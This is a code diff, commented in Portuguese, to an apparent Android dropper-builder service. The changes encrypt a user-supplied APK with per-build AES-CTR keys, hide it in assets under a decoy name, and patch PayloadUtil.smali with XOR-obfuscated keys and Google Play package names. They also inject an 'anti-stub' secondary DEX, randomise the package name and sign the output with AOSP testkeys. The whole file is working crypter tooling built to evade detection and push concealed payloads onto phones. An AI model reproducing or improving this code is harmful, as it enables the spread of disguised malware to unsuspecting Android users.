@@ -1,4 +1,5 @@
 import os
+import random
 import re
 import secrets
 import shutil
@@ -7,37 +8,124 @@ import subprocess
 import xml.etree.ElementTree as ET
 import zipfile
 
+from Crypto.Cipher import AES
 from werkzeug.utils import secure_filename
 
 from config import Config
 from services.build_state import BUILD_STATUS
 from services.data import add_build_history, add_history, update_amplification
-from services.java_runtime import JAVA_BIN
+from services.java_runtime import JAVA_BIN, java_env, keytool_bin
 
 
-def encrypt_lcg(data, seed):
-    j = seed
-    encrypted = bytearray()
-    for byte in data:
-        j = ((j * 1664525) + 1013904223) & 0xFFFFFFFF
-        xor_val = (j >> 24) & 0xFF
-        encrypted.append(byte ^ xor_val)
-    return encrypted
+def encrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
+    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).encrypt(data)
 
 
-def slugify_package_segment(name, max_len=20):
-    segment = re.sub(r"[^a-z0-9]", "", name.lower())
-    if not segment or not segment[0].isalpha():
-        segment = "app" + segment
-    return (segment[:max_len] or "app")
+def decrypt_aes_ctr(data: bytes, key: bytes, iv: bytes) -> bytes:
+    return AES.new(key, AES.MODE_CTR, nonce=b"", initial_value=iv).decrypt(data)
+
+
+def _xor_bytes(data: bytes, xor_byte: int) -> bytes:
+    return bytes(b ^ xor_byte for b in data)
+
+
+def _smali_byte(value: int) -> str:
+    value &= 0xFF
+    if value >= 0x80:
+        value -= 0x100
+    return f"        {value}t"
+
+
+def _smali_array_data(data: bytes) -> str:
+    lines = "\n".join(_smali_byte(b) for b in data)
+    return f"    .array-data 1\n{lines}\n    .end array-data"
+
+
+def patch_payload_util_smali(
+    dropper_work: str,
+    *,
+    xor_byte: int,
+    asset_name: str,
+    out_name: str,
+    key: bytes,
+    iv: bytes,
+    cipher: str,
+) -> None:
+    """Reescreve constantes XOR'd em PayloadUtil.smali para este build."""
+    path = None
+    for root, _, files in os.walk(os.path.join(dropper_work, "smali")):
+        if "PayloadUtil.smali" in files:
+            path = os.path.join(root, "PayloadUtil.smali")
+            break
+    if not path:
+        raise RuntimeError("PayloadUtil.smali nao encontrado no template.")
+
+    with open(path, "r", encoding="utf-8", errors="ignore") as handle:
+        content = handle.read()
+
+    content = re.sub(
+        r"\.field private static final XOR:I = 0x[0-9a-fA-F]+",
+        f".field private static final XOR:I = 0x{xor_byte:x}",
+        content,
+        count=1,
+    )
+
+    google_pkgs = (
+        b"com.google.android.gms",
+        b"com.android.vending",
+        b"com.google.android.gsf",
+        b"com.google.android.as",
+        b"com.google.android.as.oss",
+    )
+
+    blobs = {
+        "asset_data": _xor_bytes(asset_name.encode("utf-8"), xor_byte),
+        "out_data": _xor_bytes(out_name.encode("utf-8"), xor_byte),
+        "key_data": _xor_bytes(key, xor_byte),
+        "iv_data": _xor_bytes(iv, xor_byte),
+        "cipher_data": _xor_bytes(cipher.encode("utf-8"), xor_byte),
+        "vending_data": _xor_bytes(b"com.android.vending", xor_byte),
+        "mime_data": _xor_bytes(b"application/vnd.android.package-archive", xor_byte),
+    }
+    for i, pkg in enumerate(google_pkgs):
+        blobs[f"pkg{i}_data"] = _xor_bytes(pkg, xor_byte)
+
+    label_to_field_size = {
+        "asset_data": len(blobs["asset_data"]),
+        "out_data": len(blobs["out_data"]),
+        "key_data": len(blobs["key_data"]),
+        "iv_data": len(blobs["iv_data"]),
+        "cipher_data": len(blobs["cipher_data"]),
+        "vending_data": len(blobs["vending_data"]),
+        "mime_data": len(blobs["mime_data"]),
+    }
+    for i in range(5):
+        label_to_field_size[f"pkg{i}_data"] = len(blobs[f"pkg{i}_data"])
+
+    for label, size in label_to_field_size.items():
+        content = re.sub(
+            rf"(const/16 v0, 0x[0-9a-fA-F]+\s+new-array v0, v0, \[B\s+fill-array-data v0, :{label})",
+            f"const/16 v0, 0x{size:x}\n    new-array v0, v0, [B\n    fill-array-data v0, :{label}",
+            content,
+            count=1,
+        )
+        content = re.sub(
+            rf"(:{label}\s*\n)\s*\.array-data 1\n.*?\n\s*\.end array-data",
+            rf"\1{_smali_array_data(blobs[label])}",
+            content,
+            count=1,
+            flags=re.S,
+        )
+
+    with open(path, "w", encoding="utf-8") as handle:
+        handle.write(content)
 
 
 def generate_package_name(app_name):
-    base = slugify_package_segment(app_name)
     suffix = secrets.choice(string.ascii_lowercase) + "".join(
         secrets.choice(string.ascii_lowercase + string.digits) for _ in range(5)
     )
-    return f"com.{base}.mobile.{suffix}"
+    return f"{Config.PACKAGE_PREFIX}.{suffix}"
 
 
 def apply_package_rename(dropper_work, old_package, new_package):
@@ -94,6 +182,181 @@ def _set_status(build_id, status, progress, error=False, portal=None, owner=None
     }
 
 
+def inject_secondary_dex(apk_path: str, dex_path: str, arcname: str = "classes2.dex") -> None:
+    """Injeta DEX AndroidX/Material como classes2.dex (casca anti-stub).
+
+    Reescreve o ZIP com zipfile → quebra alignment de 4 bytes.
+    Sempre chamar zipalign_apk() antes de apksigner.
+    """
+    if not os.path.isfile(dex_path):
+        raise RuntimeError(f"DEX de libs nao encontrado: {dex_path}")
+    if not os.path.isfile(apk_path):
+        raise RuntimeError(f"APK para injecao de DEX nao encontrado: {apk_path}")
+
+    tmp_path = f"{apk_path}.dexinject"
+    with zipfile.ZipFile(apk_path, "r") as zin, zipfile.ZipFile(
+        tmp_path, "w", compression=zipfile.ZIP_DEFLATED
+    ) as zout:
+        for info in zin.infolist():
+            if info.filename == arcname:
+                continue
+            # Preserve stored/deflated for resources.arsc and friends
+            data = zin.read(info.filename)
+            compress = zipfile.ZIP_STORED if info.compress_type == zipfile.ZIP_STORED else zipfile.ZIP_DEFLATED
+            out_info = zipfile.ZipInfo(filename=info.filename, date_time=info.date_time)
+            out_info.compress_type = compress
+            out_info.external_attr = info.external_attr
+            zout.writestr(out_info, data)
+        zout.write(dex_path, arcname)
+    os.replace(tmp_path, apk_path)
+
+
+def _generate_keystore(
+    keystore_path: str,
+    store_pass: str,
+    key_alias: str,
+    key_pass: str,
+    dname: str,
+) -> None:
+    """Gera keystore PKCS12 com DN fixo (release estável)."""
+    keytool = keytool_bin()
+    if not keytool:
+        raise RuntimeError("keytool nao encontrado (JAVA_HOME/bin/keytool).")
+    os.makedirs(os.path.dirname(keystore_path) or ".", exist_ok=True)
+    cmd = [
+        keytool,
+        "-genkeypair",
+        "-storetype",
+        Config.KEYSTORE_STORE_TYPE,
+        "-keystore",
+        keystore_path,
+        "-storepass",
+        store_pass,
+        "-keypass",
+        key_pass,
+        "-alias",
+        key_alias,
+        "-keyalg",
+        Config.KEYSTORE_KEY_ALG,
+        "-keysize",
+        str(Config.KEYSTORE_KEY_SIZE),
+        "-sigalg",
+        Config.KEYSTORE_SIG_ALG,
+        "-validity",
+        str(Config.KEYSTORE_VALIDITY_DAYS),
+        "-dname",
+        dname,
+    ]
+    result = subprocess.run(
+        cmd, capture_output=True, text=True, timeout=60, env=java_env()
+    )
+    if result.returncode != 0:
+        err = (result.stderr or result.stdout or "keytool falhou").strip()
+        raise RuntimeError(f"Falha ao gerar keystore: {err[:300]}")
+
+
+def ensure_release_keystore() -> tuple[str, str, str, str]:
+    """Garante signing/release.p12 (cria 1x se ausente). Retorna path, pass, alias, key_pass."""
+    path = Config.RELEASE_KEYSTORE
+    store_pass = Config.RELEASE_KEYSTORE_PASS
+    key_pass = store_pass  # PKCS12: key pass == store pass
+    alias = Config.RELEASE_KEY_ALIAS
+    if not os.path.isfile(path):
+        _generate_keystore(path, store_pass, alias, key_pass, Config.RELEASE_DNAME)
+    return path, store_pass, alias, key_pass
+
+
+def zipalign_apk(input_apk: str, output_apk: str) -> None:
+    """Realinha APK apos inject_secondary_dex (apksigner nao realinha)."""
+    if not os.path.isfile(Config.ZIPALIGN):
+        raise RuntimeError("zipalign nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
+    cmd = [Config.ZIPALIGN, "-p", "-f", "4", input_apk, output_apk]
+    result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
+    if result.returncode != 0 or not os.path.isfile(output_apk):
+        err = (result.stderr or result.stdout or "zipalign falhou").strip()
+        raise RuntimeError(f"Falha no zipalign: {err[:300]}")
+
+
+def sign_with_apksigner(
+    aligned_apk: str,
+    output_apk: str,
+    *,
+    keystore_path: str | None = None,
+    store_pass: str | None = None,
+    key_alias: str | None = None,
+    key_pass: str | None = None,
+    key_pk8: str | None = None,
+    cert_pem: str | None = None,
+) -> str:
+    """Assina APK com apksigner (v2; v3 conforme Config). Sem v1.
+
+    Preferir AOSP testkey via key_pk8+cert_pem; fallback PKCS12 via keystore_*.
+    """
+    if not os.path.isfile(Config.APKSIGNER):
+        raise RuntimeError("apksigner nao encontrado. Verifique APP-TEST/tools/android-sdk/.")
+    v3 = "true" if Config.APKSIGNER_V3_ENABLED else "false"
+    cmd = [
+        Config.APKSIGNER,
+        "sign",
+        "--v1-signing-enabled",
+        "false",
+        "--v2-signing-enabled",
+        "true",
+        "--v3-signing-enabled",
+        v3,
+        "--out",
+        output_apk,
+    ]
+    if key_pk8 and cert_pem:
+        if not os.path.isfile(key_pk8) or not os.path.isfile(cert_pem):
+            raise RuntimeError("AOSP testkey ausente (signing/testkey.pk8 + testkey.x509.pem).")
+        cmd.extend(["--key", key_pk8, "--cert", cert_pem])
+    elif keystore_path:
+        cmd.extend(
+            [
+                "--ks",
+                keystore_path,
+                "--ks-pass",
+                f"pass:{store_pass}",
+                "--ks-key-alias",
+                key_alias,
+                "--key-pass",
+                f"pass:{key_pass}",
+            ]
+        )
+    else:
+        raise RuntimeError("Nenhum material de assinatura configurado.")
+    cmd.append(aligned_apk)
+    result = subprocess.run(
+        cmd, capture_output=True, text=True, timeout=120, env=java_env()
+    )
+    if result.returncode != 0 or not os.path.isfile(output_apk):
+        err = (result.stderr or result.stdout or "apksigner falhou").strip()
+        raise RuntimeError(f"Falha na assinatura: {err[:300]}")
+    return output_apk
+
+
+def sign_release_apk(aligned_apk: str, output_apk: str) -> str:
+    """Assina conforme Config.SIGNING_MODE (aosp_testkey | pkcs12)."""
+    mode = (Config.SIGNING_MODE or "aosp_testkey").strip().lower()
+    if mode == "aosp_testkey":
+        return sign_with_apksigner(
+            aligned_apk,
+            output_apk,
+            key_pk8=Config.AOSP_TESTKEY_PK8,
+            cert_pem=Config.AOSP_TESTKEY_CERT,
+        )
+    keystore_path, store_pass, key_alias, key_pass = ensure_release_keystore()
+    return sign_with_apksigner(
+        aligned_apk,
+        output_apk,
+        keystore_path=keystore_path,
+        store_pass=store_pass,
+        key_alias=key_alias,
+        key_pass=key_pass,
+    )
+
+
 def process_apk(
     build_id,
     user_apk_path,
@@ -146,7 +409,11 @@ def process_apk(
         dropper_work = os.path.join(Config.UPLOAD_FOLDER, f"{build_id}_dropper")
         if os.path.exists(dropper_work):
             shutil.rmtree(dropper_work)
-        shutil.copytree(Config.DROPPER_TEMPLATE, dropper_work)
+        shutil.copytree(
+            Config.DROPPER_TEMPLATE,
+            dropper_work,
+            ignore=shutil.ignore_patterns("prebuilt", "build"),
+        )
 
         app_name = custom_app_name if custom_app_name else "App"
         new_package = generate_package_name(app_name)
@@ -200,11 +467,39 @@ def process_apk(
         _set_status(build_id, "Injetando Payload", 60)
         with open(user_apk_path, "rb") as file_handle:
             payload_data = file_handle.read()
-        encrypted = b"\x00" * 16 + encrypt_lcg(payload_data, Config.SEED)
-        payload_path = os.path.join(dropper_work, "assets/dbliqgnjl.dat")
-        os.makedirs(os.path.dirname(payload_path), exist_ok=True)
+
+        key = secrets.token_bytes(32)
+        iv = secrets.token_bytes(16)
+        xor_byte = secrets.randbelow(255) + 1
+        asset_name = random.choice(Config.ASSET_NAME_POOL)
+        out_name = f"index_{secrets.token_hex(2)}.pak"
+        ciphertext = encrypt_aes_ctr(payload_data, key, iv)
+
+        roundtrip = decrypt_aes_ctr(ciphertext, key, iv)
+        if roundtrip[:4] != b"PK\x03\x04" and payload_data[:4] == b"PK\x03\x04":
+            raise RuntimeError("Gate AES falhou: magic PK ausente apos roundtrip.")
+        if roundtrip != payload_data:
+            raise RuntimeError("Gate AES falhou: plaintext diverge do payload.")
+
+        assets_dir = os.path.join(dropper_work, "assets")
+        os.makedirs(assets_dir, exist_ok=True)
+        for stale in os.listdir(assets_dir):
+            stale_path = os.path.join(assets_dir, stale)
+            if os.path.isfile(stale_path):
+                os.remove(stale_path)
+        payload_path = os.path.join(assets_dir, asset_name)
         with open(payload_path, "wb") as file_handle:
-            file_handle.write(encrypted)
+            file_handle.write(ciphertext)
+
+        patch_payload_util_smali(
+            dropper_work,
+            xor_byte=xor_byte,
+            asset_name=asset_name,
+            out_name=out_name,
+            key=key,
+            iv=iv,
+            cipher=Config.CIPHER_TRANSFORM,
+        )
 
         _set_status(build_id, "Compilando APK", 80)
         unsigned_apk = os.path.join(Config.OUTPUT_FOLDER, f"{build_id}_unsigned.apk")
@@ -230,29 +525,32 @@ def process_apk(
                 err = (res_b.stderr or res_b.stdout or "apktool falhou sem mensagem").strip()
                 raise RuntimeError(f"Erro na compilacao: {err[:300]}")
 
+        _set_status(build_id, "Empacotando bibliotecas", 85)
+        inject_secondary_dex(unsigned_apk, Config.DROPPER_LIBS_DEX)
+
         _set_status(build_id, "Assinando APK", 90)
         output_dir = os.path.join(Config.OUTPUT_FOLDER, build_id)
         os.makedirs(output_dir, exist_ok=True)
 
-        if not os.path.exists(Config.SIGNER_JAR):
-            raise RuntimeError("Ferramenta de assinatura nao encontrada.")
+        if not os.path.isfile(Config.APKSIGNER) or not os.path.isfile(Config.ZIPALIGN):
+            raise RuntimeError(
+                "apksigner/zipalign nao encontrados. Verifique APP-TEST/tools/android-sdk/."
+            )
 
-        res_s = subprocess.run(
-            f'"{JAVA_BIN}" -jar "{Config.SIGNER_JAR}" --apks "{unsigned_apk}" --out "{output_dir}"',
-            shell=True,
-            capture_output=True,
-            text=True,
-        )
-
+        # inject_secondary_dex desalinha o ZIP → zipalign obrigatório antes do sign
+        aligned_apk = os.path.join(output_dir, f"{build_id}_aligned.apk")
+        signed_apk = os.path.join(output_dir, "app-release.apk")
         final_apk = None
-        if os.path.exists(output_dir):
-            for filename in os.listdir(output_dir):
-                if filename.endswith(".apk"):
-                    final_apk = os.path.join(output_dir, filename)
-                    break
 
-        if not final_apk:
-            raise RuntimeError(f"Erro na assinatura: {res_s.stderr}")
+        try:
+            zipalign_apk(unsigned_apk, aligned_apk)
+            final_apk = sign_release_apk(aligned_apk, signed_apk)
+        finally:
+            if os.path.exists(aligned_apk):
+                os.remove(aligned_apk)
+
+        if not final_apk or not os.path.isfile(final_apk):
+            raise RuntimeError("Assinatura nao produziu APK final.")
 
         final_name = f"{secure_filename(app_name)}.apk"
         shutil.move(final_apk, os.path.join(Config.OUTPUT_FOLDER, final_name))
